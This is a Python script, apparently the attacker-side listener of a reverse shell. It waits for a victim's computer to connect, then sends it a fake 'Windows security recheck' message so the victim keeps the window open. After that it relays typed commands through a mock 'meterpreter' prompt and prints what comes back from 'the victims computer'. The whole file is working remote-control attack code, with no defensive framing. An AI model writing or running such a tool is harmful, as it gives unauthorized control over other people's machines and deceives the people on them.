import socket
import time
from colored import bg, fg, attr

green = fg("green")
blue = fg("blue")
red = fg("red")


def listener():
    try:
        s = socket.socket()
        print(" ")
        host = input(green + "[#] Enter your connecting ip > ")
        port = int(input(green + "[#] Enter your connecting port > "))
        s.bind((host, port))

        s.listen(1)
        print(blue + "[?] Listening...")

        while True:
            c, addr = s.accept()
            print(green + "      [x] Connected with " + str(addr))
            c.send(bytes("Don't close the window. Windows security recheck.Please wait... ", "UTF-8"))
            break

        def cmd():
            while True:
                global cmd
                global new
                time.sleep(1)
                cmd = str(input(green + "meterpreter > "))
                if cmd == "quit":
                    c.close()
                    break
                elif cmd == "help":
                    print(green + "[-] You can use any command prompt commands to browse through the victims computer")
                elif len(cmd) == 0:
                    print(red + "[-] No result")
                elif len(cmd) > 0:
                    c.send(bytes(cmd, "UTF-8"))
                global answer
                answer = c.recv(10000).decode()
                print(answer)

        cmd()
    except:
        print(red + "[x] Address you entered is not valid in its context")


